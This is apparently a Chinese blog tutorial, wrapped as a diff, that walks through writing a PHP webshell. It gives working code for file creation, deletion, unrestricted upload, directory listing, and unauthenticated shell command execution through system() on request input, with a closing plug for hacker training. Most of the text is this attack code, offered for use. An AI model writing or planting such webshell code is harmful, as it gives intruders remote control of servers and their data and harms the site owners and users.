@@ -1,0 +1,41 @@
+本文原创作者：Laimooc
+第一部分：前沿综述
+本次我主要写了【文件的创建】、【文件的删除】、【文件的上传】、【目录浏览】、【命令执行】小模块，以及【组合的目录浏览和文件删除功能】的模块：
+实验环境：
+系统环境：winserver 12 r2 datacenter
+脚本运行环境：PHP version7.0.24
+第二部分：代码编写讲解
+【文件创建】
+作者是借助form表单值传递，以及使用fopen和fwrite进行创建文件的。
+具体的研究过程，我们结合代码来说明：
+<form method= "" action= "" > Filename :<inputtype= "text" name= "file" value= "" />
+这里我们是使用input标签，设定name值（这个，我们后面的php脚本中需要使用的，需要记住）：
+我的代码如下，大家请指导：
+File_content :<inputtype= "textarea" name= "file_content" style= "width:300px;" value= "" />
+这里我们是接受form表单传递你要写的文件内容，有想深入的表格，可以对内容的写入上做出一些编码解码等的操作
+< input type = "submit" name = "submit" value = "Create" > 这里是提交按钮 </ form > <?php error_reporting( 0 ); $filename = $_REQUEST [ 'file' ]; $file_content = $_REQUEST [ 'file_content' ]; $myfile =fopen( $filename , "a" ) ; fwrite( $myfile , $file_content ); fclose( $myfile ); ?>
+【文件删除】
+下面是我们的删除文件代码，依然是借助了form表单，这样主要是为了操作起来方便，不用form表单也可以操作，只是比较麻烦（get或者post请求等）
+代码如下：
+< form method="" action = "" > Filename: < inputtype="text" name = "delfile" value = "" > < inputtype="submit" name = "submit" value = "delete" > </ form > form表单的意思同上述我们阐述的意思，不再介绍，不懂的同学，可以下方留言给我，第一时间必回复 <?php error_reporting( 0 ); $delfile = $_REQUEST [ 'delfile' ]; if (! isset ( $delfile )){ exit ; } else { if (!unlink( $delfile )) { echo ( "Error delete $delfile" ); } else { echo ( "Deleted $file" ); } } ?>
+【文件上传】
+文件的上传，这个是大家应该比较多见的了，文件类型的限制啦、存储等（如果作大马的话，当然是任意文件上传啦），不再详细的解释直接展示一下代码，如果大家有什么不懂之处也可以在下方留言给我：
+代码如下：
+< form action = "" method = "post" enctype = "multipart/form-data" /> < label for = "userfile" > Upload file </ label > < input type = "file" name = "file" id = "file" /> < input type = "submit" value = "send file" /> </ form > <?php error_reporting( 0 ); if ((( $_FILES [ "file" ][ "type" ] == "image/gif" ) || ( $_FILES [ "file" ][ "type" ] == "text/plain" ) || ( $_FILES [ "file" ][ "type" ] == "application/octet-stream" ))) { if ( $_FILES [ "file" ][ "error" ] > 0 ) { echo "Return Code: " . $_FILES [ "file" ][ "error" ] . "<br />" ; } else { echo "Upload: " . $_FILES [ "file" ][ "name" ] . "<br />" ; echo "Type: " . $_FILES [ "file" ][ "type" ] . "<br />" ; echo "Size: " . ( $_FILES [ "file" ][ "size" ] / 1024 ) . " Kb<br />" ; echo "Temp file: " . $_FILES [ "file" ][ "tmp_name" ] . "<br />" ; if (file_exists( "upload/" . $_FILES [ "file" ][ "name" ])) { echo $_FILES [ "file" ][ "name" ] . " already exists. " ; } else { move_uploaded_file( $_FILES [ "file" ][ "tmp_name" ], "upload/" . $_FILES [ "file" ][ "name" ]); echo "Stored in: " . "upload/" . $_FILES [ "file" ][ "name" ]; } } } else { exit ; } ?>
+【目录浏览】
+文件的浏览，我还没有仔细的研究，有深入研究的朋友，可以在下方回复代码哇，一起进（fei）步（sheng），我的代码比较垃圾：我直接指定了要遍历的文件目录，在编写的过程中，我发现如果目录不存在的话，会直接浏览器占用资源崩溃！！！
+<?php error_reporting( 0 ); header( "Content-type:text/html; charset=utf8" ); $current_dir = 'upload' ; $dir =opendir( $current_dir ); echo '本文件：' ,dirname( __FILE__ ), '\\' ,basename( __FILE__ ), '<br/>' ; while ( false !==( $file = readdir( $dir ))){ if ( $file != "." && $file != ".." ){ echo "<li>$file</li>" ; } } closedir( $dir ); ?> 此外，参考了别人的dir()函数和getcwd()，觉得挺不错的，可以结合使用，大家可以改造一下。 <?php $d =dir(getcwd()); echo "Handle:" . $d ->handle . "<br>" ; echo "Path:" . $d ->path . "<br>" ; while (( $file = $d ->read()) !== false ){ echo "filename: " . $file . "<br>" ; } $d ->close(); ?>
+【命令执行】
+命令执行，这是一个好玩的东西，php给了我们一些直接可以执行系统命令的函数: exec()、passthru()、system()、 shell_exec() 还有一个神奇的：反引号。
+反引号，听起来尬不?
+我的研究是使用system进行执行命令的，然后结合form表单进行值传递，主要还是为了表单的美观：
+代码如下：
+< form method = "" action = "" > Command: < input type = "text" name="exec" value = "" > < input type = "submit" name="submit" value = "exec" > </ form > <?php error_reporting( 0 ); $exec = $_REQUEST [ 'exec' ]; system( $exec ); ?>
+【组合的目录浏览和文件删除功能】
+本小节是为了抛砖引玉，整体的变幻构造组合等，需要大家共同努力，直接展示一下代码：
+代码如下：
+<?php error_reporting( 0 ); header( "Content-type: text/html; charset=utf8" ); $current_dir = 'upload' ; $dir = opendir( $current_dir ); echo '本文件：' ,dirname( __FILE__ ) , '\\' ,basename( __FILE__ ), '<br/>' ; while ( false !== ( $file = readdir( $dir ))){ if ( $file != "." && $file != ".." ){ echo "<li>$file</li>" ; } } closedir( $dir ); ?> < form method="" action = "" > Filename: < input type = "text" name = "delfile" value = "" > < input type = "submit" name = "submit" value = "delete" > </ form > <?php $delfile = $_REQUEST [ 'delfile' ]; if (! isset ( $delfile )){ exit ; } else { if (!unlink( $delfile )) { echo ( "Error deleting $delfile" ); } else { echo ( "Deleted $file" ); } } ?>
+第三部分：文章总结
+本次研究是继双十一之夜，睡不着觉，就来发了一篇文章，希望得到大家的指导，路过请留言，一带一路。
+附件回原文下载<<<<<<<<
+>>>>>>黑客入门必备技能 带你入坑，和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩！
